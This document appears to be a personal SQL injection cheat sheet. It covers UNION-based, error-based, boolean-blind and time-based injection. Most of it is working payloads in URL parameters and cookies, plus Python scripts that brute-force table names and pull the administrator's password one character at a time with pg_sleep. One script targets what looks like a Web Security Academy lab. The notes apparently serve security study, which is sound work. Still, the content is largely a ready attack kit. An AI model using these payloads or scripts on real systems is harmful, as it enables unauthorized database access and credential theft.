# SQL injection Manual

Tags : #sqli #sqlinjection #sql #blindsqli #pysqli #sqli_cheatsheet

## Info
SQL Comments : double hiphen and space -- -
hashtag # 

---

Determine all the urls with parameters in it 
Example :
```
https://www.example.com/products?id=2
https://www.example.com/products?category=Computers
https://www.example.com/products?id=2&username=tech69
```
Now try to put single quote ' or double quote " and see any errors in the response

if we got any errors that means that parameter is vulnerable to sql injection 

----

## OR and AND Injection

ok , now we determined our injection point (parameter)
let's use OR and AND clauses to make TRUE and FALSE result
```
https://www.example.com/products?id=2' OR 1=1 -- -
https://www.example.com/products?id=2' AND 1=2 -- -
https://www.example.com/products?id=2' OR 1=1 # 
https://www.example.com/products?id=2' AND 1=2 # 
```

We can try for bypassing login page . Most time will not work but worths a try .

---

## Determining number of columns using ORDER BY

We can sort the results in the resposne using **ORDER BY** keyword
This will sort according to the column name or number 
Suppose there are 3 columns and if we sort according to 4th column we get error because there is no 4th column

Sorting according to first column
```
https://www.example.com/products?id=2' ORDER BY 1 -- -
```

Sorting according to second column
```
https://www.example.com/products?id=2' ORDER BY 2-- -
```

If we got 500 server error that means there is only one column 
```
https://www.example.com/products?id=2' ORDER BY 3 -- -
https://www.example.com/products?id=2' ORDER BY 4 -- -


```

---

## UNION Based Injection

We can try Union clause and use another SELECT statement and get information

**UNION will combine only results of SELECT statements .**

## Determining number of columns using UNION and SELECT

We can determine number of columns the backend sql query is returning using UNION also .
First we select one NULL and if its got error that means there is column mismatch between backend query and our select query .
Then we increase NULL and we continue 
whenever we get 200 response that means our number of NULL's are equal to the number of columns backend query is returning

```
https://www.example.com/products?id=2' UNION SELECT NULL -- -
https://www.example.com/products?id=2' UNION SELECT NULL,NULL from dual -- -
https://www.example.com/products?id=2' UNION SELECT NULL,NULL,NULL -- - 
and so on ...
```

--- 

## Determining VARCHAR column using UNION and SELECT

Now , we got number of columns backend query is returning . 
we need to determine which column returns string type .
instead of NULL we put a string and test each column 

Suppose we found that there are 4 columns
```
https://www.example.com/products?id=2' UNION SELECT 'a',NULL,NULL,NULL -- -
https://www.example.com/products?id=2' UNION SELECT NULL,'a',NULL,NULL from dual -- -
https://www.example.com/products?id=2' UNION SELECT NULL,NULL,'a',NULL -- -
https://www.example.com/products?id=2' UNION SELECT NULL,NULL,NULL,'a' -- -
```
if any one got 200 response that means that respective column is string type

--- 

## Getting Information from string column

We determined say 2nd column is string type
we can get sql version and other information 

### Default Tables in Different Database types 
```
Oracle - dual , v$version ,all_tables , all_tab_columns
MySQL,PostgreSQL - information_schema.tables,information_schema.columns
SQLite - sqlite_master
```

```
mysql> show variables like "%version%"
    -> ;
+-------------------------+-------------------------+
| Variable_name           | Value                   |
+-------------------------+-------------------------+
| innodb_version          | 5.7.34                  |
| protocol_version        | 10                      |
| slave_type_conversions  |                         |
| tls_version             | TLSv1,TLSv1.1,TLSv1.2   |
| version                 | 5.7.34-0ubuntu0.18.04.1 |
| version_comment         | (Ubuntu)                |
| version_compile_machine | x86_64                  |
| version_compile_os      | Linux                   |
+-------------------------+-------------------------+
8 rows in set (0.04 sec)

```

Getting information from string type column
```
https://www.example.com/products?id=2' UNION SELECT NULL,@@version,NULL -- -
https://www.example.com/products?id=2' UNION SELECT NULL,version(),NULL -- -
https://www.example.com/products?id=2' UNION SELECT NULL,BANNER,NULL from v$version -- -
https://www.example.com/products?id=2' UNION SELECT NULL,@@version_compile_machine,NULL -- -
```

--- 

## Dumping all Tables and data

**ORACLE **
```
https://www.example.com/products?id=2' UNION SELECT NULL,TABLE_NAME,NULL from all_tables -- -
https://www.example.com/products?id=2' UNION SELECT NULL,COLUMN_NAME,NULL from all_tab_columns where table_name = 'users'
```

**MySQL,MSSQL,PostgreSQL**
```
https://www.example.com/products?id=2' UNION SELECT NULL,TABLE_NAME,NULL from information_schema.tables -- -
https://www.example.com/products?id=2' UNION SELECT NULL,COLUMN_NAME,NULL from information_schema.columns where table_name = 'users' -- -
```

Dumping data from columns
```
https://www.example.com/products?id=2' UNION SELECT NULL,CONCAT(column1,'|',column2),NULL from table_name -- -
```

--- 

## Blind SQL Injection 

Sometimes we dont get error or any data in the response but still website can be vulnerable to sql injection . 
Example : in the cookie 
we can try to inject some statements in cookie 

### Conditional Responses

we will inject FALSE condition then server sends normal response .
then we will inject TRUE condition then server sends different or lightly different response
that means we can inject sql queries there

**FALSE Condition** - default length of response
```
Cookie : TrackingID = abcdef' AND '1'='2 
```

**TRUE Condition**
```
Cookie : TrackingID = abcdef' AND '1'='1
```

If we get response length > default length 
then its vulnerable to blind sqli

Verifying which database
```
Cookie : TrackingID = abcdef' AND (SELECT 'a' from dual LIMIT 1)='a
Cookie : TrackingID = abcdef' AND (SELECT 'a' from information_schema.tables LIMIT 1)='a
```

in blind sqli , we need to perform maximum bruteforcing

Bruteforcing tablenames
```
Cookie : TrackingID = abcdef' AND (SELECT 'a' from information_schema.columns where table_name='$users$' LIMIT 1)='a
```
send this to intruder and bruteforce the table names 

```python
import requests

tables = ['users','login','hashes']
cookie = 'abcdef'
r = requests.get(url)
default_length = len(r.text)
for i in tables:
	final_cookie = cookie + "' AND (SELECT 'a' from information_schema.columns where table_name='{}' LIMIT 1)='a".format(i)
	full_cookie = {"TrackingId":final_cookie}
	temp = requests.get(url,cookies=full_cookie)
	if len(temp.text)>default_length:
		print("{} table exists".format(i))
```

Bruteforcing Column names

```
Cookie : TrackingID = abcdef' AND (SELECT SUBSTRING(CONCAT('a',$column_name$),1,1)='a' from users LIMIT 1)='a
```

Determining Maximum of length of that column

we can use 
```
MAX(LENGTH(column_name))
```

Bruteforce the number to determine the maximum
```
Cookie : TrackingID = abcdef' AND (SELECT MAX(LENGTH(password)) from users)='$1$
```

Bruteforcing data in columns
Let's assume there is password column in users table

```
Cookie : TrackingID = abcdef' AND (SELECT SUBSTRING(password,$1$,1)='$a$' from users LIMIT 1)='a
```

```python
import requests
letters \= \['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',\\
'1','2','3','4','5','6','7','8','9','0'\]

url \= 'https://ac7f1faa1f7fa42d8008166d004a000a.web-security-academy.net/filter?category=Gifts'
cookie \= 'vQiTsU5UJcK5E5a2'

password \= ''

for i in range(1,21):
	for j in letters:
		final\_cookie \= cookie +"'%3B(select CASE when SUBSTRING(password,{},1)='{}' THEN pg\_sleep(4) else '' end from users where username='administrator')-- -".format(i,j)
		full\_cookie \= {"TrackingId":final\_cookie}
		print("Trying {} position with {}".format(i,j))
		temp \= requests.get(url,cookies\=full\_cookie)
		if temp.elapsed.total\_seconds()\>3:
			password += j
			print(password)
			break

print(password)

```

---

### Conditional Errors

Sometimes there will be no difference in responses from TRUE and FALSE conditions
then we need to trigger an exception and db cant hanle then we get 500 server error indicating our sql query is correct

SELECT CASE
```
select case when (condition) then condition2 else condition3 end 
```

```
SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END from table
```

```
ORACLE - TO_CHAR(1/0)
PostgreSQL - cast(1/0 as text)
MySQL - IF(condition,true-condition,else-condition)
```

Example : 
```
Cookie : TrackingID = abcdef'+(SELECT '' from information_schema.tables LIMIT 1)+'

Cookie : TrackingID = abcdef'||(SELECT '' from dual)||'

```

Bruteforcing tables
```
Cookie : TrackingID = abcdef'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from $table_name$)||'
```

Bruteforcing columns
```
Cookie : TrackingID = abcdef'||(SELECT CASE WHEN(MAX(LENGTH($username$))>0) THEN TO_CHAR(1/0) ELSE '' END from users)||'
```

Bruteforcing data in columns
Example : usernames 
```
Cookie : TrackingID = abcdef'||(SELECT CASE WHEN (MAX(LENGTH(username))>0) THEN TO_CHAR(1/0) ELSE '' END from users where username='$administrator$' )||'
```

Bruteforcing data (passwords)
```
Cookie : TrackingID = abcdef'||(SELECT CASE WHEN (SUBSTR(password,1,1)='$a$') THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator')||'
```
if we got error that means our condition is true

--- 

### Time Delays 

upto now we got errors but what if exceptions are handled correctly ? , in this case we tell db to sleep for few seconds if condition is true
we should see some delay in response

Different time delay techniques for different databases
```
ORACLE - dbms_pipe.recieve_message(('a'),5)
PostgreSQL - pg_sleep(5)
Microsoft - WAITFOR DELAY '0:0:5'
MySQL - sleep(5)
```

Checking the type of database 
```
Cookie : TrackingID = abcdef';(SELECT '' from information_schema.tables LIMIT 1)-- -

Cookie : TrackingID = abcdef'%3B(sleep(5))-- -

Cookie : TrackingID = abcdef'%3B(pg_sleep(5))-- -
```

Bruteforcing tables
```
Cookie : TrackingID = abcdef'%3B(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE '' from $table_name$) -- -
```

Bruteforcing columns
```
Cookie : TrackingID = abcdef'%3B(SELECT CASE WHEN SUBSTRING(CONCAT('a',$username$),1,1)='a' THEN pg_sleep(5) ELSE '' from table_name) -- -
```

Bruteforcing data 
```
Cookie : TrackingID = abcdef'%3B(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE '' from table_name where username='$administrator$') -- -

Cookie : TrackingID = abcdef'%3B(SELECT CASE WHEN SUBSTRING(password,1,1)='$a$' THEN pg_sleep(5) ELSE '' from users where username='administrator') -- -

```

Python code to test the response delay
```python
import requests
r = requests.get(url)
print(r.elapsed.total_seconds())
```